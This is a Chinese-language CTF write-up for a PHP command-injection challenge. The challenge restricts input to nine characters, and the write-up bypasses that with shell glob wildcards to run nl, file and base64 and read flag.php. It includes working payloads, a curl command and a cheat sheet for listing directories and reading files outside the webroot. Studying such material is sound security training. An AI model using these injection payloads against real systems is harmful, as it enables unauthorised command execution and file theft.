## 一句话

> 白名单锁死的是**「我能输入的 9 个字符」**（`/` `?` `.` 空格 `f` `l` `a` `6` `4`），锁不死**「shell 把它们 glob 展开之后得到的那个字符串」**。
> 所以解法不是「把 `cat flag.php` 拼出来」，而是**用 `?` 去磁盘上把命令名和文件名钓出来**：

```
c=/???/?l fla?.???
```

## 一、题目：白名单到底允许什么

### 1.1 题目源码

```php
if (preg_match("#^[/?. fla64]*$#", $c)) {
    system($c);
}
```

`preg_match` 用 `^...*$` 锚定了**整串**，字符类里只有 9 个字符 —— 只要出现任何一个白名单外的字符，直接走到 `no no no!` 分支，`system` 根本不执行。

### 1.2 白名单就是这 9 个字符

| 字符 | 角色 |
|---|---|
| **`?`** | **唯一能「生成任意字符」的符号**（glob 单字符通配） |
| `f` `l` `a` `6` `4` | 仅有的 5 个**锚点字符**（只有它们能原样写出来） |
| `/` `.` 空格 | 路径与参数语法 |

换句话说：**26 个字母里只给我 4 个（`f l a` + 数字 `6 4`），其余 22 个字母和 10 个数字全都得靠 `?` 现场匹配。**

### 1.3 出题人留下的钥匙孔：`6` 和 `4`

白名单里有 `6` 和 `4` —— Linux 上带数字后缀的通用工具，基本**只有 `base64`**（`2`、`3` 都不在名单里，`base32` / `base32` 系全废）。

> **这是出题人留下的钥匙孔**：他给了 `64` 两个数字，就等于默许你去用 `base64`；顺带把所有「不需要数字名字」的常用工具也留在了桌上（`nl` / `file` / `cat` / `ls` / `find` / `stat`/ `du` / `df` …）—— 后面「形状 + 排序第一」就是在这堆工具里做筛选。

### 1.4 入口与 URL 结构

```
http://主机/?c=<payload>
              ↑↑
              │└─ 参数名（脚本写死 $_GET['c']）
              └─ ? 开始查询串；缺了它 payload 会跑进"路径" → 404
空格必须编码为 %20 或 +
```

| 错误现象 | 说明 |
|---|---|
| 缺 `?c=` | HTTP 404（Apache 的 404 页） |
| 空格没编码 | HTTP 000（URL 非法） |
| 参数名错 / 多一个 `?` | HTTP 200 但**把 PHP 源码显示出来**（`$_GET['c']` 未设置） |

## 二、思路：把命令当字符串去凑

### 2.1 核心洞察

> **白名单限制的是「我能输入的字符」，限制不了「shell 展开 glob 之后得到的字符串」。**
>
> **解法不是「把命令拼出来」，而是「用 `?` 去磁盘上把命令名和文件名钓出来」。**

```
❌ 想：只给 9 个字符，怎么写得出 "cat flag.php"？
✅ 想：磁盘上【本来就有】 /bin/cat 和 flag.php，
       我只要写出【能匹配到它们的模式】就行
```

**关键推论**：既然命令名和文件名都是**磁盘上已经存在**的字符串，那我需要的不是「拼写能力」，而是**「匹配能力」** —— 而 `?` 恰好就是匹配符号。

### 2.2 payload 构造三规则

```
① `?` 的【个数】 = 目标里"非白名单字符"的个数
② `?` 的【位置】 = 那些字符原来的位置
③ 【命令位那一个词，glob 展开后排序第一必须是可执行文件】
```

**第一个词的例子**（真实路径 `/bin/base64`）：

```
真实:  /  b  i  n  /  b  a  s  e  6  4
检查:  v  x  x  x  v  x  v  x  x  v  v
结果:  /  ?  ?  ?  /  ?  a  ?  ?  6  4      →  /???/?a??64
```

**其他常用目标**（`?` 的个数就是「非白名单字符」的个数，`.` 也算一位）：

```
flag.php → fla?.???     （f l a 是锚点，g/p/h 用 ? 代替，. 原样，php 三个字母全 ?）
nl       → ?l
file     → f???
cat      → ?a?
```

### 2.3 长度必须精确

> **`.` 也占一位。**

`flag.php` 共 **8 个字符** → `????????`（8 个 `?`）和 `????.???`（4+1+3）**都能命中同一个文件**，但长度写错（多一个或少一个 `?`）就直接匹配不到、**静默空白**。

### 2.4 命令候选：形状 + 排序第一

**同一层里可能有好几个程序匹配同一个形状** —— glob 展开后按**排序**给出结果，`system` 拿到的是**排在最前的那个**（`?` 展开成多个词时，第一个词被当成命令，剩下的全当参数）。所以判定一个命令候选能不能用，只有两条：

> **推论**：「排序」具体是**字典序**、以及「第一个词当命令、其余当参数」这条 shell 行为，是把日志的「排序第一」与「第一个词必须是程序」两句**一般化**后的表述；日志本身只写了判定结论。

| 命令 | 形状 | payload | 结果 |
|---|---|---|---|
| **`nl`** | `?l` | `/???/?l` | ✅ **唯一命中，最干净**（输出带行号） |
| **`file`** | `f???` | `/???/f???` | ✅ 第一命中就是它；**唯一能列目录** |
| `base64` | `?a??64` | `/???/?a??64` | ✅ 唯一，但**只吃一个文件参数** |
| `cat` | `?a?` | `/???/?a?` | ⚠️ 命中 cat / tac / tar → 混 50 万字节二进制 |
| `tail` | `?a?l` | `/???/?a?l` | ⚠️ 命中 tail / wall，同理 |
| `ls` | `l?` | `/???/l?` | ❌ 被 `ln` 抢位 |
| `find` | `f???` | `/???/f???` | ❌ 被 `file` 抢位 |
| `stat` | `??a?` | `/???/??a?` | ❌ 被 `head` 抢位 |
| `du` / `df` | `??` | `/???/??` | ❌ 被 `ar` 抢位 |

**这张表就是「命令候选一条条试完」的最终成果**：9 个候选里只有 3 个能上桌，而**列目录这件事只有 `file` 能做**。

### 2.5 为什么「箱子」偏偏是 `file`

`file` 是**唯一同时满足三条**的工具：

1. **输出带结构化签名**（`<路径>: <类型>`）—— 一眼看出是文件还是目录
2. **错误也打到 stdout**（`cannot open`）→ 让「不存在」也**可见**
3. **只 stat 不读内容**（不会踩 `/dev/random` 卡死）

> **「找箱子」和「用工具」是同一个动作** —— 写下 `/???/f???` 跑通了，就同时完成「找到箱子（可执行文件在哪）」+「拿到工具（file 能用了）」。猜错了只是空白，换下一个候选即可（**候选只有 5 个**）。

### 2.6 深度与层数

| 层级 | 路径 | 说明 |
|---|---|---|
| 第 0 层 | `/` | 根目录（19 个条目，全是目录/符号链接） |
| **第 1 层** | `/bin` `/sbin` `/etc` `/usr` … | **命令住在第 1 层** |
| 第 2 层 | `/usr/bin` `/usr/sbin` | usrmerge 真身 |
| 第 3 层 | `/var/www/html` | **cwd（我们在这里）** |

- **命令必须绝对路径**（相对 glob 只在 webroot 展开，那里没有可执行文件）
- **数据（`flag.php`）用相对路径** —— `chdir(__DIR__)` 已经把进程放在 webroot
- **深度候选只有 5 个**：`/???`、`/???/???`、`/????`、`/???/????`、`/???/?????/???`
- **usrmerge**：`/bin`→`usr/bin`，第 1、2 层常命中同一文件（**BuildID 相同可证**）
- **深度会随实例变化**：`/sys/bus/faux` 的有无会改变「排序第一」

### 2.7 怎么判断「到根了」（不用数层数）

根目录的 `..` 指向自己，越过根不会变化 → **两层输出一字不差就是到根了**：

```
../          → html
../../       → lock mail
../../../    → boot home proc root sbin
../../../../ → boot home proc root sbin      ← 与上一层一字不差 = 到根了
```

> ⚠️ **你永远不在根目录** —— 每条 payload 都是**独立进程**，cwd 永远是 `/var/www/html`。`../` 只在**那一条命令内部**有效，不会「留在」上一层的目录里。

### 2.8 三个关键技术

**① 哨兵**：payload 末尾带参数 `/`，出现 `/: directory` 就说明**命令位跑起来了**

```
c=/???/f??? /   →  ... /: directory        ✅ file 在说话
c=/????/f??? /  →  fsck from util-linux    ❌ fsck 在说话（没哨兵看不出来）
```

**② 一次问完所有候选**：把候选当**参数**并列

```bash
c=/???/f??? /???/???/f??? /????/f??? /???/????/f??? /???/?????/???/f???
# file 把命中的报成真实路径，没命中的报 cannot open → 一张真值表
```

**③ 只能依赖正向证据**

> 错误不可见时，「没输出」是**多义的**（glob 没匹配 / 命令无输出 / 命令位被抢 / 参数个数错）。
> 所以要用 `file`（让「不存在」也可见）+ 哨兵（让「是否上场」可判定）。

## 三、完整 payload

### 3.1 通关流程（七步）

```
① 看源码   → 白名单 9 个字符：  / ? . 空格 f l a 6 4
② 开锁     → /???/?l fla?.???          先用最强形状(?l)拿到回显能力
③ 拿工具   → /???/f???                 箱子在哪 → 可迁移到所有命令
④ 定位     → /???/f??? /????/????/???  → /var/www/html
⑤ 清点     → /???/f??? ? ?? ??? ????   → flag.php / index.php
⑥ 读取     → /???/?l fla?.???          → flag 🚩
⑦ 备用     → 找不到就用 ../ 往外走
```

**最终 payload 只有一个**：

```bash
# 空格要编码成 %20 或 +，浏览器/curl 里两种都行
curl -s "http://<host>/?c=/???/?l%20fla?.???"
# → 0xGame{72119ccb-2d0e-4103-a07d-495616e27805}
```

**`?l` 为什么是「最强形状」**：`/???/?l` 在候选表里**唯一命中 `nl`**，输出干净、带行号、零噪声 —— 拿到它等于**先拿到「回显能力」**，后面所有侦察都靠它看结果。

### 3.2 payload 速查表

| 目的 | payload |
|---|---|
| 读文件（最干净） | `/???/?l <文件>` |
| 读文件（二进制安全） | `/???/?a??64 <文件>` |
| 列根目录 | `/???/f??? /? /?? /??? /???? /????? /??????` |
| 列出当前目录 | `/???/f??? ? ?? ??? ???? ????? ?????? ??????? ???????? ????.??? ?????.???` |
| 问「我在哪」 | `/???/f??? /????/????/???` |
| 读 webroot 外的文件 | `/???/?l ../../???/????????` |
| 不需要知道路径读 flag | `/???/?a??64 /????/????/???/fla?.???` |
| **哨兵** | 任意 payload 后加参数 `/` |

### 3.3 靶机中途换过域名（三个实例）

**日志明确记录：靶机换了 3 次实例，中途换过域名。** 关键差异项如下（日志没有逐实例编号，这里只列可确证的）：

| 记录项 | 实测（日志原文） |
|---|---|
| 实例个数 | **3 个**（「靶机换了 3 次实例」「靶机中途换过域名」） |
| 什么时候必须换域名 | **实例已销毁** —— 表现为 **HTTP 404 的网关页（4681 字节）**，与缺 `?c=` 时的 Apache 404 页**不是同一个页面**（页大小可区分） |
| 实例之间的差异 | **深度/层数候选会变**：`/sys/bus/faux` 的有无会改变「排序第一」，同一个 `/???/???/f???` 在有的实例上被目录抢走 |
| 应对 | ① **缓存原始数据**（每次侦察的响应原样留档，否则实例一销毁就没法复盘）② **一次问完所有深度候选**（真值表）③ 换域名后**重跑形状判定** |

**⭐ 教训**：动态靶机的「命令候选表」**不是全局常量** —— 同一个形状在不同实例上可能第一命中不同的东西，所以每次换实例都要**重新用哨兵确认命令位**。

### 3.4 命令候选是怎么一条条试完的

> 下面这张流程图是**把日志里的步骤（哨兵 / 一次问完候选 / 真值表 / 抢位）串成一条线**的整理稿，路径与判据都来自日志原文，**流程图的画法是推论**。

```
候选池（能想到的、名字长度 ≤6 的通用工具）
        ↓  按「白名单锚点 f l a 6 4」筛出可写形状
形状集合  ?l   f???   ?a?   ?a??64   ?a?l   l?   ??a?   ??
        ↓  每个形状先加【哨兵】跑一次 —— 看命令位到底有没有上场
哨兵判定  /???/f??? /   → /: directory          ✅ 上场
        /????/f??? /  → fsck from util-linux   ❌ 被 fsck 抢位
        ↓  上场的再用【file 一次问完候选】拿真值表
真值表    命中的报真实路径（/usr/bin/nl ...），没命中的报 cannot open
        ↓  按「输出是否干净 / 参数个数限制」排序
可用      nl ✅（?l 唯一）  file ✅（f??? 第一）  base64 ✅（?a??64 唯一，只吃 1 个文件）
不可用    ls（被 ln 抢）  find（被 file 抢）  stat（被 head 抢）  du/df（被 ar 抢）
危险      cat / tail（形状命中多个程序，混进 50 万字节二进制）
```

**9 个候选 → 3 个可用 → 最终答案落在 `nl` 上**。判定细节都在 §2.4 的表里。

### 3.5 本机关键情报（实测）

- cwd = `/var/www/html`；flag 在 `flag.php`（65 字节）
- 根目录 19 个条目，**全是目录/符号链接，没有 flag 文件**
- `/bin` 里 270+ 个条目（名字长度 1~6）：**184 个 ELF + 37 个脚本 + 50 个符号链接**
- usrmerge：`/bin`→`usr/bin`、`/lib`→`usr/lib`、`/sbin`→`usr/sbin`
- `/sbin` 里有 `fsck`、`mkfs`、`zic`、`pwck` —— **是另一个工具箱**（`/????/f???` 抢位事故就出在这里）

### 3.6 判据速记

| 现象 | 结论 |
|---|---|
| `/: directory` | 命令位 OK |
| `/x: cannot open` | x 不存在 |
| `ELF ... executable` | 可执行文件（能当命令） |
| `directory` | 文件夹（**不能**当命令） |
| `symbolic link to Y` | 链接，真身在 Y |
| **BuildID 相同** | 两条路径是同一个文件 |
| 逐层内容重复 | 到根目录了 |
| `H4sI` 开头 | base64(gzip)，可解压（另一题「奶蛙的博客」的锚点，见 [奶蛙的博客.md](./奶蛙的博客.md)） |

## 四、踩坑与排查表

### 4.1 「有输出但不是预期 / 完全空白」排查表（全实测）

| 症状 | 原因 | 修法 |
|---|---|---|
| **HTTP 404（Apache 页）** | URL 缺 `?c=` | 补 `?c=` |
| **HTTP 404（网关页 4681 字节）** | **实例已销毁** | 换新域名 |
| **HTTP 000** | URL 里空格没编码 | 用 `%20` 或 `+` |
| **200 + 显示 PHP 源码** | `$_GET['c']` 未设置（参数名错 / 多一个 `?`） | 检查 `?c=` |
| **200 + 0 字节** | 命令位少了开头 `/`（相对 glob 在 webroot 匹配不到） | **命令位必须绝对** |
| **200 + 0 字节** | 只写路径没写命令（如 `../../../`） | **第一个词必须是程序** |
| **200 + 0 字节** | 命令位被目录抢走（`/???/???/f???` → `/sys/bus/faux`） | 换形状 / 加哨兵 |
| **200 + 0 字节** | `base64` 拿到 ≥2 个文件参数 | 多文件改用 `nl` |
| **200 + `no no no!`** | 有非法字符（`_`、`bin` 里的字母） | 只允许 `/ ? . 空格 f l a 6 4` |
| **有输出但不是预期** | 别的程序抢了命令位（`/????/f???` → `fsck from util-linux`） | 看输出里的**真实路径** |
| **15 秒后连接中断** | 参数 glob 命中了 `/dev/full`、`/dev/random` | 先用 `file` 预览 |

### 4.2 教训：空响应是多义的

> **⭐ 「空响应」是多义的（至少 4 种成因）** —— glob 没匹配 / 命令无输出 / 命令位被抢 / 参数个数错。
> 所以必须靠**哨兵**和 **`file` 的 `cannot open`** 制造**正向证据**，否则你根本不知道是「没钓到」还是「钓到了但被抢了」。

## 五、可复用方法论

### 5.1 十条（跨当晚三题）

1. **侦察优先级**：响应头 > 静态资源 > `robots.txt` > 页面正文
2. **把提示翻译成数据流**：明确编码方向 + **校验锚点**（`H4sI`、`0xGame{}`）
3. **有索引就枚举**（`id=1..124`），不要顺着链接爬
4. **不确定的维度就并列穷举**（长度、深度），让靶机用「空/非空」回答
5. **只能依赖正向证据**：构造「只有成功才出现」的输出（哨兵 / `cannot open`）
6. **形状命中 ≠ 身份正确**：看真实路径 / BuildID 确认
7. **客户端校验不是校验**；**前端 JS 是最好的接口文档**
8. **空响应是多义的**，必须交叉验证
9. **每步打印可验证的中间量**（块数、长度、魔数、状态码）
10. **缓存原始数据**（靶机换了 3 次实例）

### 5.2 这题真正留下来的三句话

> **① 白名单限制输入字符，限制不了 glob 展开后的字符串。**
> **② `?` 的个数 = 非白名单字符的个数；命令位那个词，展开后排序第一必须是可执行文件。**
> **③ 空响应是多义的 —— 先用哨兵确认「命令位有没有上场」，再用 `file` 让「不存在」也开口说话。**

**一句话总结**：**不要「拼」命令，要「钓」命令** —— 磁盘上本来就有 `/bin/nl` 和 `flag.php`，你只需要写出能匹配它们的模式。
